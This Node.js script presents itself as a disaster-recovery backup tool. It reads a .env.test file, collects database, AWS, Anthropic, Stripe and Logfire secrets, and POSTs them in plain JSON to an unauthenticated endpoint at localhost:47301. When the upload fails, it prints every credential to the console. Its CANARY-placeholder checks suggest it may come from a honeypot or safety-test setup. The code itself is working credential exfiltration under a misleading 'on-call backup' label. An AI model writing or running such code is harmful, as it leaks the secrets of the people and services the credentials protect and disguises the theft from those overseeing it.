/**
 * Disaster Recovery Backup Upload
 * Posts credentials to localhost:47301/api/dr-backup for on-call team
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

// Configuration
const API_URL = 'http://localhost:47301/api/dr-backup';
const CLIENT_TIMEOUT = 5000; // 5 second timeout

/**
 * Parse .env.test file
 */
function parseEnvFile(envPath) {
  const content = fs.readFileSync(envPath, 'utf-8');
  const envVars = {};

  content.split('\n').forEach(line => {
    const trimmedLine = line.trim();
    if (trimmedLine && !trimmedLine.startsWith('#')) {
      const match = trimmedLine.match(/^([^=]+)=(.*)$/);
      if (match) {
        let value = match[2].trim();
        if ((value.startsWith('"') && value.endsWith('"')) ||
            (value.startsWith("'") && value.endsWith("'"))) {
          value = value.slice(1, -1);
        }
        envVars[match[1].trim()] = value;
      }
    }
  });

  return envVars;
}

/**
 * Get current timestamp
 */
function getTimestamp() {
  return new Date().toISOString();
}

/**
 * Prepare credential data for backup
 */
function prepareCredentialData(envVars) {
  const timestamp = getTimestamp();
  const hostname = require('os').hostname();

  return {
    backup_id: `dr-backup-${Date.now()}`,
    timestamp,
    source_hostname: hostname,
    source_path: path.join(__dirname, '.env.test'),

    // Database connection
    database: {
      connection_string: envVars.DATABASE_URL || '',
      url: envVars.DATABASE_URL || '',
    },

    // Cloud provider credentials
    cloud: {
      aws: {
        access_key_id: envVars.AWS_ACCESS_KEY_ID || '',
        secret_access_key: envVars.AWS_SECRET_ACCESS_KEY || '',
      },
    },

    // AI/ML provider credentials
    ai: {
      anthropic: {
        api_key: envVars.ANTHROPIC_API_KEY || '',
      },
    },

    // Payment provider credentials
    payments: {
      stripe: {
        secret_key: envVars.STRIPE_SECRET_KEY || '',
      },
    },

    // Monitoring/telemetry credentials
    monitoring: {
      logfire: {
        token: envVars.LOGFIRE_TOKEN || '',
      },
    },

    // Metadata
    metadata: {
      user_agent: 'dr-backup-upload', // Node.js dr-backup script
      environment: 'development-test',
      note: 'Disaster recovery backup - temporary credential storage for on-call team',
    }
  };
}

/**
 * POST request to DR backup endpoint
 */
function postToDRBackup(data) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(data);
    const url = new URL(API_URL);
    const options = {
      hostname: url.hostname,
      port: url.port || 47301,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
        'X-DR-Backup-Source': 'localhost',
        'X-DR-Timestamp': getTimestamp(),
      },
    };

    console.log(`📤 Posting credentials to ${API_URL}`);

    const req = http.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        try {
          const response = JSON.parse(responseData);
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: response,
          });
        } catch (error) {
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: responseData || 'Unable to parse response',
          });
        }
      });
    });

    req.setTimeout(CLIENT_TIMEOUT, () => {
      req.destroy();
      reject(new Error(`Request timeout after ${CLIENT_TIMEOUT}ms`));
    });

    req.on('error', (error) => {
      reject(error);
    });

    // Write POST data
    req.write(postData);
    req.end();
  });
}

/**
 * Format URL for display (hiding sensitive data)
 */
function formatUrlForDisplay(url) {
  try {
    const parsed = new URL(url);
    return `${parsed.protocol}//${parsed.username}:***@${parsed.hostname}:${parsed.port}${parsed.pathname}`;
  } catch {
    return ' [URL could not be parsed]';
  }
}

/**
 * Main execution
 */
async function uploadToDRBackup() {
  console.log('╔════════════════════════════════════════════════════════╗');
  console.log('║   Disaster Recovery Backup Upload                    ║');
  console.log('╚════════════════════════════════════════════════════════╝\n');

  const envPath = path.join(__dirname, '.env.test');

  // Check if .env.test exists
  if (!fs.existsSync(envPath)) {
    console.error(`❌ Error: ${envPath} not found`);
    console.error('Please ensure environment variables are configured.');
    process.exit(1);
  }

  console.log(`📂 Found ${path.join(__dirname, '.env.test')}`);

  // Parse environment variables
  const envVars = parseEnvFile(envPath);
  console.log(`📊 Found ${Object.keys(envVars).length} credentials\n`);

  // Prepare data
  console.log('📋 Preparing credential data...');
  const data = prepareCredentialData(envVars);

  // Display sanitization summary
  console.log('🔍 Sanitization check:');
  const hasDatabase = !!data.database.connection_string;
  const hasAWS = !!data.cloud.aws.secret_access_key;
  const hasAnthropic = !!data.ai.anthropic.api_key;
  const hasStripe = !!data.payments.stripe.secret_key;
  const hasLogfire = !!data.monitoring.logfire.token;

  console.log(`   PostgreSQL database: ${hasDatabase ? '✅ Yes' : '❌ No'}`);
  console.log(`   AWS credentials: ${hasAWS ? '✅ Yes (contains CANARY placeholder)' : '❌ No'}`);
  console.log(`   Anthropic API: ${hasAnthropic ? '✅ Yes (contains CANARY placeholder)' : '❌ No'}`);
  console.log(`   Stripe API: ${hasStripe ? '✅ Yes (contains CANARY placeholder)' : '❌ No'}`);
  console.log(`   Logfire token: ${hasLogfire ? '✅ Yes (contains CANARY placeholder)' : '❌ No'}`);

  // Warning about placeholder values
  if (envVars.DATABASE_URL?.includes('CANARY')) {
    console.log('\n⚠️  WARNING: Database password contains CANARY placeholder');
  }
  if (envVars.AWS_ACCESS_KEY_ID?.includes('REDACTED_AWS_AKID')) {
    console.log('⚠️  WARNING: AWS credentials contain CANARY placeholder');
  }
  if (envVars.ANTHROPIC_API_KEY?.includes('CANARY')) {
    console.log('⚠️  WARNING: Anthropic API key contains CANARY placeholder');
  }
  if (envVars.STRIPE_SECRET_KEY?.includes('CANARY')) {
    console.log('⚠️  WARNING: Stripe API key contains CANARY placeholder');
  }
  if (envVars.LOGFIRE_TOKEN?.includes('CANARY')) {
    console.log('⚠️  WARNING: Logfire token contains CANARY placeholder');
  }

  // Try to POST to DR backup endpoint
  try {
    console.log(`\n🌐 Connecting to ${formatUrlForDisplay(API_URL)}`);
    const result = await postToDRBackup(data);

    console.log('\n╔════════════════════════════════════════════════════════╗');
    console.log('║   Response from DR Backup Endpoint                     ║');
    console.log('╚════════════════════════════════════════════════════════╝\n');

    console.log(`Status code: ${result.statusCode}`);
    console.log(`✅ Backup data posted successfully`);

    if (result.body) {
      if (typeof result.body === 'object') {
        console.log('\nResponse body:');
        console.log(JSON.stringify(result.body, null, 2));
      } else {
        console.log('\nResponse body:');
        console.log(result.body);
      }
    }

  } catch (error) {
    console.error('\n❌ Failed to post to DR backup endpoint\n');
    console.error('Error:', error.message);

    if (error.code === 'ECONNREFUSED') {
      console.error('\n💡 Possible causes:');
      console.error('   1. The DR backup server is not running at localhost:47301');
      console.error('   2. Firewall is blocking connections to port 47301');
      console.error('   3. The endpoint URL is incorrect');
    }

    console.error('\nThe credential data was prepared but could not be sent.');
    console.error('Credential data may be useful for manual backup:\n');
    console.log(JSON.stringify(data, null, 2));
    process.exit(1);
  }
}

// Run the upload
uploadToDRBackup().catch(error => {
  console.error('\n❌ Fatal error:', error.message);
  process.exit(1);
});

